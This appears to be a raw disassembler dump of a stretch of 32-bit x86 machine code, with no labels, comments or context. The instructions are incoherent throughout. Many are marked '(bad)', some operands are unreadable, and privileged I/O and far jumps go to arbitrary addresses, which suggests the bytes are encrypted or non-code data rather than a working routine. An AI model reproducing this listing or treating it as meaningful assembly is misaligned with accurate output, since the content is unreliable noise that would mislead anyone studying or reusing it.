  4176c9:	shl    DWORD PTR ds:0xc1b671b8,1
  4176cf:	(bad)  
  4176d2:	pusha  
  4176d3:	mov    ah,0x24
  4176d5:	jo     0x41772e
  4176d7:	pop    eax
  4176d8:	inc    edx
  4176d9:	inc    esp
  4176da:	mov    cl,BYTE PTR [ebp+0x43]
  4176dd:	xchg   BYTE PTR [eax+edx*1+0x5c],ch
  4176e1:	fnstenv [ebp+0x5e]
  4176e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e5:	pop    ds
  4176e6:	scas   eax,DWORD PTR es:[edi]
  4176e7:	sbb    esi,DWORD PTR [edx+0x23c5af76]
  4176ed:	fstp   TBYTE PTR [edx+eax*4+0x2987c6ce]
  4176f4:	mov    ds,WORD PTR [ecx-0x52a692dd]
  4176fa:	shl    DWORD PTR [edi],0xbd
  4176fd:	fwait
  4176fe:	loop   0x41771c
  417700:	fdiv   st,st(7)
  417702:	push   cs
  417703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417704:	xor    DWORD PTR [eax+0x34],eax
  417707:	(bad)  
  417708:	sbb    dh,BYTE PTR [ebx+esi*2-0x7d5593f8]
  41770f:	push   es
  417710:	cs iret 
  417712:	aad    0x26
  417714:	gs sbb eax,0x56b8b2f0
  41771a:	jo     0x4176eb
  41771c:	cmp    DWORD PTR [ebx+0x57],ecx
  41771f:	retf   0x30a1
  417722:	mov    eax,ds:0x3917679f
  417727:	xor    eax,0x1f60ea32
  41772c:	fst    DWORD PTR [edx-0x7c66ef48]
  417732:	cld    
  417733:	pop    eax
  417734:	clc    
  417735:	bnd jge 0x417707
  417738:	out    dx,eax
  417739:	cmp    al,bl
  41773b:	pop    ss
  41773c:	ins    DWORD PTR es:[edi],dx
  41773d:	xchg   ebp,eax
  41773e:	mov    ds,WORD PTR [edi+eax*2+0x6]
  417742:	sti    
  417743:	lahf   
  417744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417745:	mov    edi,0x60d8370b
  41774a:	jno    0x4177a2
  41774c:	jae    0x4176e6
  41774e:	and    cl,BYTE PTR [edx]
  417750:	xchg   ebp,eax
  417751:	push   eax
  417752:	dec    ebx
  417753:	js     0x417757
  417755:	repz out 0x5f,eax
  417758:	(bad)  
  417759:	sar    BYTE PTR [edi],1
  41775b:	into   
  41775c:	mov    edx,0x5ef4f4cc
  417761:	scas   eax,DWORD PTR es:[edi]
  417762:	or     al,0x5e
  417764:	retf   0x124b
  417767:	je     0x41773b
  417769:	mov    ecx,0x1f29b8c5
  41776e:	adc    BYTE PTR [edi+0x7],dh
  417771:	jnp    0x41772a
  417773:	retf   0x3eb
  417776:	ds push eax
  417778:	inc    eax
  417779:	lods   al,BYTE PTR ds:[esi]
  41777a:	lahf   
  41777b:	mov    ebx,0x1b9c8351
  417780:	inc    ebp
  417781:	jns    0x41779a
  417783:	xchg   ebx,eax
  417784:	add    dl,BYTE PTR [eax-0x3a88897f]
  41778a:	xor    dl,cl
  41778c:	dec    ebx
  41778d:	or     esi,ebp
  41778f:	add    esp,ebx
  417791:	jmp    0x9e9255d5
  417796:	cli    
  417797:	lods   al,BYTE PTR ds:[esi]
  417798:	pop    eax
  417799:	or     ebp,DWORD PTR [edi+0x3e]
  41779c:	xlat   BYTE PTR es:[ebx]
  41779e:	jmp    0x41780a
  4177a0:	xor    DWORD PTR ds:0x2bf8d366,esp
  4177a6:	jmp    0x417794
  4177a8:	xor    bh,0x5c
  4177ab:	out    dx,al
  4177ac:	ret    
  4177ad:	push   ebx
  4177ae:	aas    
  4177af:	add    bl,BYTE PTR [esi+eiz*1]
  4177b2:	fld    QWORD PTR [eax+eax*8-0x2b988c5d]
  4177b9:	dec    edi
  4177ba:	repnz inc esi
  4177bc:	nop
  4177bd:	adc    DWORD PTR [eax+eax*4-0x80],eax
  4177c1:	test   eax,0x6108529d
  4177c6:	add    al,0x3b
  4177c8:	pop    ecx
  4177c9:	aam    0x81
  4177cb:	xchg   ebx,eax
  4177cc:	xor    BYTE PTR [edx+0x3c],dl
  4177cf:	call   0x54fc:0x96ed314
  4177d6:	adc    dh,BYTE PTR [eax+0x8b46982]
  4177dc:	(bad)  
  4177dd:	test   eax,0xb819d67c
  4177e2:	lods   al,BYTE PTR ds:[esi]
  4177e3:	mov    bh,0x8c
  4177e5:	jecxz  0x4177ce
  4177e7:	outs   dx,BYTE PTR ds:[esi]
  4177e8:	xchg   ebx,eax
  4177e9:	mov    edx,0xc4b44816
  4177ee:	mov    eax,ds:0xdfbfcf35
  4177f3:	std    
  4177f4:	dec    ebx
  4177f5:	int3   
  4177f6:	mov    ds:0x61f353b0,al
  4177fb:	dec    ebx
  4177fc:	mov    ebx,0x75d51964
  417801:	mov    ds:0x9b6b84e7,al
  417806:	mov    bl,0x11
  417808:	fs mov ebp,0xd14fb237
  41780e:	ret    0x74b8
  417811:	dec    ebx
  417812:	(bad)  
  417813:	push   esi
  417814:	lods   al,BYTE PTR ds:[esi]
  417815:	out    dx,al
  417816:	mov    ecx,0xa7552536
  41781b:	cli    
  41781c:	inc    edi
  41781d:	adc    cl,bl
  41781f:	and    al,BYTE PTR [eax]
  417821:	(bad)  
  417822:	sahf   
  417823:	and    al,0x93
  417825:	int    0xbe
  417827:	jne    0x4177f3
  417829:	cmp    esp,DWORD PTR [edx]
  41782b:	add    ebx,edx
  41782d:	sub    al,0xae
  41782f:	ins    BYTE PTR es:[edi],dx
  417830:	(bad)
  417833:	xor    dl,BYTE PTR [ebp*8+0x49b2e8a1]
  41783a:	fist   DWORD PTR [edx]
  41783c:	sbb    eax,0x400ab63b
  417841:	int    0x4a
  417843:	loop   0x4177fc
  417845:	push   ebx
  417846:	bound  esp,QWORD PTR [eax]
  417848:	push   ebp
  417849:	in     eax,dx
  41784a:	outs   dx,DWORD PTR ds:[esi]
  41784b:	cli    
  41784c:	cmp    esp,edi
  41784e:	mov    ah,BYTE PTR [ebx-0xfec5c7]
  417854:	stos   DWORD PTR es:[edi],eax
  417855:	dec    edx
  417856:	(bad)  
  417857:	xor    esi,DWORD PTR [edi]
  417859:	inc    esi
  41785a:	sub    al,BYTE PTR [ecx]
  41785c:	jmp    0x41783b
  41785e:	mov    BYTE PTR [ebx+0x51403825],bl
  417864:	outs   dx,DWORD PTR ds:[esi]
  417865:	pop    esp
  417866:	arpl   sp,bp
  417868:	fs popa 
  41786a:	lods   al,BYTE PTR ds:[esi]
  41786b:	frstor [edi-0x5525807b]
  417871:	cmp    dh,ah
  417873:	and    esi,DWORD PTR [edi-0x11]
  417876:	in     al,dx
  417877:	sbb    DWORD PTR [esi],ebx
  417879:	(bad)  
  41787a:	jle    0x417890
  41787c:	mov    al,ds:0xc1c5a94d
  417881:	daa    
  417882:	mov    ecx,0x965a04d1
  417887:	hlt    
  417888:	sbb    ah,BYTE PTR [ebp-0x2a4629f9]
  41788e:	stos   BYTE PTR es:[edi],al
  41788f:	retf   0xbfa4
  417892:	mov    dh,al
  417894:	outs   dx,DWORD PTR ds:[esi]
  417895:	inc    ebx
  417896:	dec    ecx
  417897:	cli    
  417898:	or     eax,0xeed1dbb
  41789d:	dec    ecx
  41789e:	mov    ds:0xddca0a77,eax
  4178a3:	lahf   
  4178a4:	xchg   esi,eax
  4178a5:	xor    BYTE PTR cs:[ecx],ch
  4178a8:	arpl   di,si
  4178aa:	push   0x60ca3282
  4178af:	sub    cl,cl
  4178b1:	mov    bh,0x13
  4178b3:	loop   0x417847
  4178b5:	lahf   
  4178b6:	out    dx,al
  4178b7:	adc    eax,0x6b7dc826
  4178bc:	mov    bh,0x66
  4178be:	cli    
  4178bf:	xor    al,0x6d
  4178c1:	cwde   
  4178c2:	cs stos DWORD PTR es:[edi],eax
  4178c4:	or     eax,0xf9990b81
  4178c9:	or     DWORD PTR [esp+ebp*8-0x11],edx
  4178cd:	call   0xc2ff8382
  4178d2:	and    BYTE PTR [edi+0x54],0xbe
  4178d6:	daa    
  4178d7:	mov    esp,0x3cb87bd5
  4178dc:	jle    0x4178b4
  4178de:	dec    ebp
  4178df:	leave  
  4178e0:	idiv   BYTE PTR [eax+0x58]
  4178e3:	add    esi,esp
  4178e5:	xchg   dh,al
  4178e7:	or     ebp,DWORD PTR ds:0xafb0bf90
  4178ed:	adc    al,0x15
  4178ef:	xchg   BYTE PTR [edx],dl
  4178f1:	mov    ch,0xeb
  4178f3:	call   0x2e0b1f75
  4178f8:	fldenv [ebx+0x7b51c381]
  4178fe:	add    bl,cl
  417900:	mov    edi,0xab233506
  417905:	fwait
  417906:	nop
  417907:	push   es
  417908:	xchg   edx,eax
  417909:	mov    WORD PTR [edx],ds
  41790b:	lods   al,BYTE PTR ds:[esi]
  41790c:	mov    eax,ds:0xa76b3d78
  417911:	stos   DWORD PTR es:[edi],eax
  417912:	add    al,0x9
  417914:	add    ah,bl
  417916:	xor    eax,0x54fea86
  41791b:	test   DWORD PTR [ebx+0x64],0xb3a9ffb1
  417922:	sahf   
  417923:	inc    edx
  417924:	and    DWORD PTR [esi-0x45],edi
  417927:	inc    edi
  417928:	ror    BYTE PTR [esi+0x6554f3bb],1
  41792e:	call   0x33439aa5
  417933:	mov    al,ds:0x3d04524
  417938:	mov    ch,0x5f
  41793a:	sub    cl,BYTE PTR [edx-0xd28aa17]
  417940:	loopne 0x4178f9
  417942:	push   cs
  417943:	stos   DWORD PTR es:[edi],eax
  417944:	jnp    0x4178f9
  417946:	mov    ah,0xf6
  417948:	clc    
  417949:	js     0x417937
  41794b:	or     dl,BYTE PTR [esi]
  41794d:	dec    edx
  41794e:	push   ss
  41794f:	xor    al,0xd0
  417951:	clc    
  417952:	or     dh,BYTE PTR [ebx-0x5c]
  417955:	or     eax,0x1c21a9
  41795a:	shr    BYTE PTR [edi-0x75],0x1e
  41795e:	mov    BYTE PTR [edi],bh
  417960:	(bad)  
  417961:	mov    bh,0xe8
  417963:	add    ecx,DWORD PTR [ebp-0x3]
  417966:	call   0x30d5:0x6e598f4
  41796d:	je     0x4179e0
  41796f:	dec    edi
  417970:	cmp    DWORD PTR [eax+ebp*8],edi
  417973:	jl     0x41796a
  417975:	cmp    eax,0xc7405320
  41797a:	aaa    
  41797b:	pop    esp
  41797c:	jb     0x417906
  41797e:	in     eax,0x53
  417980:	adc    ecx,edi
  417982:	mov    cl,0xbf
  417984:	(bad)  
  417985:	ffreep st(4)
  417987:	scas   eax,DWORD PTR es:[edi]
  417988:	inc    ecx
  417989:	in     al,0xcc
  41798b:	sub    eax,0xcbe6d561
  417990:	ins    BYTE PTR es:[edi],dx
  417991:	sub    ebp,ebp
  417993:	xor    BYTE PTR [edi-0x58],dl
  417996:	add    cl,dh
  417998:	xor    al,0x87
  41799a:	adc    esp,DWORD PTR [eax+eiz*1]
  41799d:	dec    ebx
  41799e:	pop    ebp
  41799f:	adc    BYTE PTR [edx-0x67589ae6],bh
  4179a5:	clc    
  4179a6:	mov    edi,0x9d149a84
  4179ab:	jo     0x4179e7
  4179ad:	inc    ebp
  4179ae:	and    dl,ah
  4179b0:	in     eax,0x10
  4179b2:	fnsave ds:[ecx]
  4179b5:	xor    DWORD PTR ds:0x38f2ceb,ecx
  4179bb:	loop   0x417a19
  4179bd:	cwde   
  4179be:	and    BYTE PTR [ecx-0x553270f1],0x8f
  4179c5:	xor    al,BYTE PTR [edi-0x6595d1f8]
  4179cb:	out    dx,al
  4179cc:	sub    bl,BYTE PTR [eax+0x45]
  4179cf:	mov    al,0x97
  4179d1:	adc    DWORD PTR [edi+0x51],esi
  4179d4:	pushf  
  4179d5:	inc    edi
  4179d6:	sub    ebx,esp
  4179d8:	xchg   edi,eax
  4179d9:	adc    al,0x65
  4179db:	sar    ch,0xc0
  4179de:	outs   dx,DWORD PTR ds:[esi]
  4179df:	or     BYTE PTR [ebx],ah
  4179e1:	pop    ss
  4179e2:	std    
  4179e3:	data16 cmp al,0xf3
  4179e6:	and    BYTE PTR [ecx],dl
  4179e8:	mov    esi,edi
  4179ea:	fcomp  QWORD PTR [ebx-0x69318572]
  4179f0:	fsub   st(6),st
  4179f2:	mov    ecx,0x9a716c94
  4179f7:	enter  0x3fa2,0xdf
  4179fb:	dec    ebx
  4179fc:	dec    edi
  4179fd:	sub    DWORD PTR [eax+0x204483b2],edi
  417a03:	pop    esp
  417a04:	xchg   esp,eax
  417a05:	push   esp
  417a06:	ret    0x490f
  417a09:	(bad)  
  417a0a:	mov    cs,WORD PTR [eax]
  417a0c:	jnp    0x4179e7
  417a0e:	and    eax,esp
  417a10:	mov    dl,0x19
  417a12:	(bad)  
  417a13:	ficom  DWORD PTR [ecx-0x2e]
  417a16:	fs int3 
  417a18:	pop    edi
  417a19:	(bad)  
  417a1a:	sbb    eax,0x22683ac9
  417a1f:	push   esp
  417a20:	pushf  
  417a21:	jne    0x417a11
  417a23:	dec    esp
  417a24:	jg     0x417a01
  417a26:	mov    edx,0x2de61542
  417a2b:	fld    TBYTE PTR [edi+0x59071d24]
  417a31:	rcr    BYTE PTR [ecx+0x1d],1
  417a34:	scas   al,BYTE PTR es:[edi]
  417a35:	retf   
  417a36:	daa    
  417a37:	lock fidiv WORD PTR [edi]
  417a3a:	loope  0x4179f4
  417a3c:	(bad)  [ebx]
  417a3e:	js     0x4179d5
  417a40:	sub    ebp,esp
  417a42:	mov    al,0x9f
  417a44:	mov    edx,0xb8d4a815
  417a49:	xor    al,0xd7
  417a4b:	(bad)  
  417a4c:	lds    esi,FWORD PTR [ebp*4-0x2f24f1de]
  417a53:	add    al,0x75
  417a55:	les    edx,FWORD PTR [eax]
  417a57:	fnstcw WORD PTR [eax+0xa]
  417a5a:	adc    esp,esi
  417a5c:	pusha  
  417a5d:	outs   dx,BYTE PTR ds:[esi]
  417a5e:	mov    eax,0xd711abb8
  417a63:	dec    al
  417a65:	and    al,BYTE PTR [edi-0x69]
  417a68:	ret    0xf982
  417a6b:	iret   
  417a6c:	and    DWORD PTR [edi-0x3f],edx
  417a6f:	add    DWORD PTR [edx-0x5a8e4ded],0xfffffff7
  417a76:	ror    DWORD PTR [esi],1
  417a78:	scas   al,BYTE PTR es:[edi]
  417a79:	push   edx
  417a7a:	sar    BYTE PTR [ebp-0x4bc5f77d],1
  417a80:	push   0xbb741b39
  417a85:	shl    esp,cl
  417a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a88:	mov    dh,0xe4
  417a8a:	(bad)  [esp+esi*2+0x3687274b]
  417a91:	mov    eax,0x9419c0f9
  417a96:	xchg   ebx,eax
  417a97:	inc    edi
  417a98:	enter  0xb596,0xb5
  417a9c:	jmp    0x417a67
  417a9e:	jne    0x417a90
  417aa0:	les    esi,FWORD PTR [ebp+0x10]
  417aa3:	outs   dx,DWORD PTR ds:[esi]
  417aa4:	mov    al,ds:0x625dd8fa
  417aa9:	das    
  417aaa:	xor    eax,DWORD PTR [esi+0x31d967ff]
  417ab0:	out    0x61,eax
  417ab2:	ins    BYTE PTR es:[edi],dx
  417ab3:	pop    esp
  417ab4:	jae    0x417b10
  417ab6:	jmp    0x417aa4
  417ab8:	sbb    DWORD PTR [ecx],eax
  417aba:	(bad)  
  417abb:	fcomp  QWORD PTR [ecx+ebx*4-0x7]
  417abf:	stos   DWORD PTR es:[edi],eax
  417ac0:	fdiv   QWORD PTR [eax]
  417ac2:	aam    0xf1
  417ac4:	test   eax,0x937b733b
  417ac9:	mov    ch,0x78
  417acb:	or     esp,DWORD PTR [ebp-0x2d72722f]
  417ad1:	push   0x37bbbe1c
  417ad6:	jne    0x417ab4
  417ad8:	fist   DWORD PTR [eax]
  417ada:	cmp    DWORD PTR [edi],ecx
  417adc:	int    0x16
  417ade:	jno    0x417b24
  417ae0:	xchg   BYTE PTR [edx-0x51],dl
  417ae3:	test   eax,0x11a2c576
  417ae8:	mov    bl,0xcb
  417aea:	fdivr  DWORD PTR [esi+0x1d]
  417aed:	into   
  417aee:	pusha  
  417aef:	cmp    DWORD PTR [ebx-0x1fc9d370],ebx
  417af5:	je     0x417b4a
  417af7:	add    eax,DWORD PTR [edx+0x1d66d9bd]
  417afd:	pop    ebx
  417afe:	mov    ?,ebp
  417b00:	das    
  417b01:	ror    BYTE PTR [eax+0x754e5bd8],1
  417b07:	in     al,dx
  417b08:	xor    eax,0xf3f22bca
  417b0d:	imul   edx,ebp,0xa109b4db
  417b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b14:	jl     0x417b20
  417b16:	pop    ss
  417b17:	out    0x96,al
  417b19:	into   
  417b1a:	and    DWORD PTR [edx+0x186f7f4a],0xffffffb2
  417b21:	mov    edi,0x5aa0bda8
  417b26:	pop    esi
  417b27:	jns    0x417b98
  417b29:	mov    ebx,0x1e70025f
  417b2e:	lods   eax,DWORD PTR ds:[esi]
  417b2f:	and    BYTE PTR [edx+0x4a12562],bh
  417b35:	pop    es
  417b36:	js     0x417b11
  417b38:	add    ebx,eax
  417b3a:	daa    
  417b3b:	iret   
  417b3c:	xlat   BYTE PTR ds:[ebx]
  417b3d:	jmp    0x9c17332d
  417b42:	cwde   
  417b43:	fwait
  417b44:	lea    ebx,[esi-0x3fe0e145]
  417b4a:	xor    al,0xed
  417b4c:	dec    bh
  417b4e:	mov    WORD PTR [edx+0x64],ds
  417b51:	int3   
  417b52:	xchg   esp,eax
  417b53:	jge    0x417af5
  417b55:	jne    0x417bc6
  417b57:	mov    al,ds:0xc6c8c0a6
  417b5c:	inc    esi
  417b5d:	or     eax,0xed68b2a1
  417b62:	dec    ebp
  417b63:	loop   0x417be3
  417b65:	dec    ebx
  417b66:	jns    0x417b3d
  417b68:	das    
  417b69:	pop    ecx
  417b6a:	mov    WORD PTR [eax],ds
  417b6c:	and    edi,DWORD PTR [edx]
  417b6e:	adc    esp,DWORD PTR [esi-0x7453a368]
  417b74:	push   ss
  417b75:	fld    TBYTE PTR [esi]
  417b77:	in     al,0xb8
  417b79:	mov    dl,0xec
  417b7b:	mov    ah,0xaa
  417b7d:	pop    ss
  417b7e:	jmp    0xc184:0x399013d3
  417b85:	repz and al,BYTE PTR [ebp-0x44]
  417b89:	push   ebx
  417b8a:	inc    eax
  417b8b:	lods   eax,DWORD PTR ds:[esi]
  417b8c:	jmp    0xcfb:0x6f81d982
  417b93:	cmp    al,BYTE PTR [ecx]
  417b95:	push   ds
  417b96:	das    
  417b97:	daa    
  417b98:	jne    0x417b20
  417b9a:	cmp    edi,esi
  417b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9d:	cmp    al,0xd
  417b9f:	mov    eax,fs:0xf0f082c9
  417ba5:	retf   0x23cb
  417ba8:	arpl   WORD PTR [esi+0x53],di
  417bab:	push   0xfffffff5
  417bad:	cdq    
  417bae:	cmp    ebx,DWORD PTR [eax-0x5936ce2f]
  417bb4:	xlat   BYTE PTR ds:[ebx]
  417bb5:	je     0x417bc7
  417bb7:	and    al,0x59
  417bb9:	mul    esi
  417bbb:	loopne 0x417b65
  417bbd:	mov    al,ds:0x1df84d30
  417bc2:	dec    ebx
  417bc3:	rcl    DWORD PTR [edi+0x282cbae0],0x64
  417bca:	dec    ecx
  417bcb:	arpl   WORD PTR [edx+0x74],dx
  417bce:	out    dx,eax
  417bcf:	into   
  417bd0:	jmp    0x5a611f1a
  417bd5:	mov    ds:0x3c1880b6,al
  417bda:	(bad)  
  417bdb:	lods   al,BYTE PTR ds:[esi]
  417bdc:	push   esp
  417bdd:	rol    ecx,1
  417bdf:	pop    esi
  417be0:	call   0xcb195aee
  417be5:	mov    ch,0x83
  417be7:	(bad)  
  417be8:	not    BYTE PTR [edx]
  417bea:	or     bh,bl
  417bec:	mov    WORD PTR [esi+0x13],?
  417bef:	jb     0x417c1d
  417bf1:	cmp    esp,edi
  417bf3:	sbb    edx,DWORD PTR [edx+0x7f2d4893]
  417bf9:	jo     0x417bbc
  417bfb:	sub    eax,0xb363a6d4
  417c00:	sub    esi,esi
  417c02:	aas    
  417c03:	mov    bh,0x41
  417c05:	out    dx,eax
  417c06:	(bad)  [edi-0x68503b2a]
  417c0c:	inc    eax
  417c0d:	jmp    0x56abf931
  417c12:	dec    eax
  417c13:	repz in al,0x5a
  417c16:	xchg   ecx,eax
  417c17:	rcl    BYTE PTR [ebx-0x43],0xda
  417c1b:	in     eax,dx
  417c1c:	test   BYTE PTR [ecx+0x71837783],al
  417c22:	cdq    
  417c23:	retf   
  417c24:	inc    ebx
  417c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c26:	mov    bl,BYTE PTR [eax-0x4d537b2]
  417c2c:	retf   
  417c2d:	xor    edx,ebp
  417c2f:	add    al,BYTE PTR [edx+0x4e]
  417c32:	push   cs
  417c33:	and    bh,cl
  417c35:	and    eax,0x7d688dae
  417c3a:	loope  0x417bc8
  417c3c:	xchg   ebp,eax
  417c3d:	xchg   esp,eax
  417c3e:	retf   0xff21
  417c41:	push   ds
  417c42:	int3   
  417c43:	fsubr  st(3),st
  417c45:	mov    bh,BYTE PTR [edi-0x29caa44c]
  417c4b:	aad    0x26
  417c4d:	fadd   st(5),st
  417c4f:	data16 xor BYTE PTR [ebx+eiz*1],ch
  417c53:	jp     0x417c63
  417c55:	(bad)  
  417c57:	and    ah,BYTE PTR [esi]
  417c59:	add    BYTE PTR [ebp+0x3234a62e],ch
  417c5f:	pop    ss
  417c60:	(bad)  
  417c61:	pop    esi
  417c62:	fstp   QWORD PTR [eax+edi*2+0x6e]
  417c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c67:	and    edx,DWORD PTR ss:[ebx]
  417c6a:	mov    esi,0x28e8a996
  417c6f:	pop    eax
  417c70:	adc    DWORD PTR [esi-0x35],edx
  417c73:	in     al,dx
  417c74:	sti    
  417c75:	repz push ds
  417c77:	inc    edi
  417c78:	xchg   esi,eax
  417c79:	xchg   DWORD PTR [ebx],edi
  417c7b:	pop    ebx
  417c7c:	jg     0x417ca2
  417c7e:	test   al,0xa1
  417c80:	mov    bl,0xd0
  417c82:	repz jnp 0x417c91
  417c85:	(bad)  
  417c86:	mov    ds:0xdb6d5638,eax
  417c8b:	pop    edx
  417c8c:	dec    edx
  417c8d:	add    al,0x91
  417c8f:	xor    BYTE PTR [ebp+0x7],bl
  417c92:	mov    dl,0x53
  417c94:	xchg   edx,eax
  417c95:	das    
  417c96:	mov    dh,0x55
  417c98:	outs   dx,DWORD PTR ds:[esi]
  417c99:	in     al,dx
  417c9a:	sbb    ecx,DWORD PTR [ebp-0x7c183231]
  417ca0:	mov    ds:0xfc3f22db,al
  417ca5:	dec    ebp
  417ca6:	sub    eax,0xe6fb3c6a
  417cab:	sub    ebx,DWORD PTR [eax+0x1b066d95]
  417cb1:	out    0xef,eax
  417cb3:	sub    cl,dh
  417cb5:	pmulhuw mm4,mm6
  417cb8:	jl     0x417d05
  417cba:	add    bl,BYTE PTR [esi+0x65]
  417cbd:	xchg   esi,eax
  417cbe:	xlat   BYTE PTR ds:[ebx]
  417cbf:	sti    
  417cc0:	jge    0x417c7b
  417cc2:	add    DWORD PTR [eax],ebp
  417cc4:	jecxz  0x417c47
  417cc6:	popa   
  417cc7:	jbe    0x417c7d
  417cc9:	xchg   esi,eax
  417cca:	in     al,dx
  417ccb:	xor    al,0xb5
  417ccd:	pop    ds
  417cce:	push   esi
  417ccf:	test   al,0x40
  417cd1:	push   ecx
  417cd2:	into   
  417cd3:	pop    ds
  417cd4:	(bad)  
  417cd5:	xchg   esp,eax
  417cd6:	mov    edx,edi
  417cd8:	adc    bh,BYTE PTR [ecx-0x78]
  417cdb:	push   ebp
  417cdc:	jbe    0x417d17
  417cde:	mov    al,ds:0x9482ca9c
  417ce3:	cli    
  417ce4:	imul   esp,DWORD PTR [ecx-0x387c741f],0xffffffbd
  417ceb:	mov    edi,0xa1eb606c
  417cf0:	or     ah,BYTE PTR [edi+0x29061356]
  417cf6:	fadd   QWORD PTR [edi+0x7d9139c2]
  417cfc:	mov    esi,0xf9c0a508
  417d01:	push   esi
  417d02:	inc    ebp
  417d03:	xor    al,0x4e
  417d05:	mov    eax,ds:0xfcefc1f9
  417d0a:	xlat   BYTE PTR ds:[ebx]
  417d0b:	jge    0x417ca4
  417d0d:	rcr    DWORD PTR [ebx-0xaba1db2],0x97
  417d14:	dec    ecx
  417d15:	mov    eax,0xe269e49e
  417d1a:	xchg   esp,eax
  417d1b:	dec    ebp
  417d1c:	sar    BYTE PTR [ebx],cl
  417d1e:	adc    DWORD PTR ds:0xac2c999e,0xffffffb9
  417d25:	or     ebp,ebp
  417d27:	mov    dh,0x9
  417d29:	popf   
  417d2a:	xchg   edi,eax
  417d2b:	or     DWORD PTR [edi],edi
  417d2d:	fild   QWORD PTR [ecx+edi*8+0x4618caf1]
  417d34:	repnz call 0xe511:0xdf358bd2
  417d3c:	fnsave [ebx+0x77048070]
  417d42:	rcl    BYTE PTR [eax+edi*2-0x16],cl
  417d46:	jl     0x417dc5
  417d48:	pop    ebx
  417d49:	stos   DWORD PTR es:[edi],eax
  417d4a:	cwde   
  417d4b:	jb     0x417d1b
  417d4d:	div    DWORD PTR [ebx]
  417d4f:	rol    DWORD PTR [edx],cl
  417d51:	(bad)  
  417d52:	stos   DWORD PTR es:[edi],eax
  417d53:	sub    al,0xb
  417d55:	aam    0x38
  417d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d58:	xchg   esi,eax
  417d59:	cs cld 
  417d5b:	sar    BYTE PTR ds:0xe9f4718e,1
  417d61:	test   DWORD PTR [ecx+0x1db23af2],ebx
  417d67:	and    edi,ebp
  417d69:	loopne 0x417d4c
  417d6b:	pop    esp
  417d6c:	cmp    DWORD PTR [edi-0x1a],ebx
  417d6f:	fiadd  WORD PTR [edx]
  417d71:	stos   DWORD PTR es:[edi],eax
  417d72:	push   edi
  417d73:	sti    
  417d74:	or     BYTE PTR [edi+0x286e41a8],bl
  417d7a:	ds jge 0x417d74
  417d7d:	(bad)  
  417d7e:	inc    ebx
  417d7f:	inc    edx
  417d80:	sub    eax,0x3d8e1474
  417d85:	adc    BYTE PTR [ebp-0x377bd930],0xd1
  417d8c:	push   0x9beb26c
  417d91:	shr    DWORD PTR [ebx-0x52],1
  417d94:	sbb    esi,eax
  417d96:	add    dl,BYTE PTR [ecx+0x5f9a3963]
  417d9c:	and    edx,DWORD PTR [esi]
  417d9e:	test   al,0x8
  417da0:	jae    0x417df4
  417da2:	js     0x417d87
  417da4:	pushf  
  417da5:	ins    BYTE PTR es:[edi],dx
  417da6:	outs   dx,DWORD PTR ds:[esi]
  417da7:	add    ah,BYTE PTR [esi-0x28]
  417daa:	mov    esi,0x23f2df4
  417daf:	fidivr WORD PTR [ecx-0x4ff9a3f]
  417db5:	mov    eax,0x41e8d481
  417dba:	or     ah,bh
  417dbc:	ss mov dh,0xd8
  417dbf:	pop    ebx
  417dc0:	fdiv   QWORD PTR [ebp+0x2]
  417dc3:	push   edi
  417dc4:	adc    bh,BYTE PTR [edi]
  417dc6:	std    
  417dc7:	dec    esp
  417dc8:	jg     0x417dd9
  417dca:	(bad)  
  417dcc:	mov    edi,0x558afdef
  417dd1:	test   DWORD PTR [eax],edx
  417dd3:	ret    
  417dd4:	sbb    esi,DWORD PTR [eax+0x28]
  417dd7:	fdiv   st,st(7)
  417dd9:	or     eax,edx
  417ddb:	cmp    DWORD PTR [esi-0x68],edi
  417dde:	jl     0x417d91
  417de0:	or     BYTE PTR ds:0xd0e0b5bc,bh
  417de6:	sti    
  417de7:	cdq    
  417de8:	(bad)  [ebx+0x79dd7117]
  417dee:	das    
  417def:	adc    al,0x26
  417df1:	mov    esp,0x68deff03
  417df6:	add    eax,DWORD PTR [edi+0x68b197d9]
  417dfc:	pop    esi
  417dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dfe:	pop    esi
  417dff:	inc    ebx
  417e00:	mov    dl,0xb7
  417e02:	pop    esp
  417e03:	adc    BYTE PTR [ecx],ch
  417e05:	sti    
  417e06:	mov    fs,WORD PTR [edi+0x65]
  417e09:	call   0xedeec3d2
  417e0e:	sbb    BYTE PTR [eax+0x28],ah
  417e11:	out    0x6a,al
  417e13:	xlat   BYTE PTR ds:[ebx]
  417e14:	sti    
  417e15:	mul    DWORD PTR [ebp-0x22]
  417e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e19:	lods   al,BYTE PTR ds:[esi]
  417e1a:	lods   eax,DWORD PTR ds:[esi]
  417e1b:	(bad)  
  417e1d:	jmp    DWORD PTR ds:0x978b01b9
  417e23:	cmp    eax,0xa0472924
  417e28:	fs add al,0x57
  417e2b:	inc    ecx
  417e2c:	test   ch,0xae
  417e2f:	sbb    al,0x6c
  417e31:	or     eax,0xfe75ee35
  417e36:	aad    0x41
  417e38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e39:	jo     0x417e95
  417e3b:	fsubr  st,st(7)
  417e3d:	sub    ah,BYTE PTR [eax-0x4e88e0d8]
  417e43:	call   0x3c9c:0x37923f6d
  417e4a:	aaa    
  417e4b:	sbb    BYTE PTR [esi+0x29],bl
  417e4e:	add    DWORD PTR [ecx-0x7b],ebp
  417e51:	not    BYTE PTR [esi]
  417e53:	push   eax
  417e54:	adc    al,0x36
  417e56:	mov    eax,DWORD PTR [esi]
  417e58:	aam    0x8c
  417e5a:	dec    edi
  417e5b:	and    BYTE PTR [ebx+0x12abb54],dl
  417e61:	and    eax,0xd82222df
  417e66:	aas    
  417e67:	or     eax,DWORD PTR [esi]
  417e69:	retf   0x3166
  417e6c:	(bad)
  417e6f:	test   DWORD PTR [ebx],ebx
  417e71:	push   ss
  417e72:	and    DWORD PTR [ebx+ebx*2+0x16],0x6a195136
  417e7a:	std    
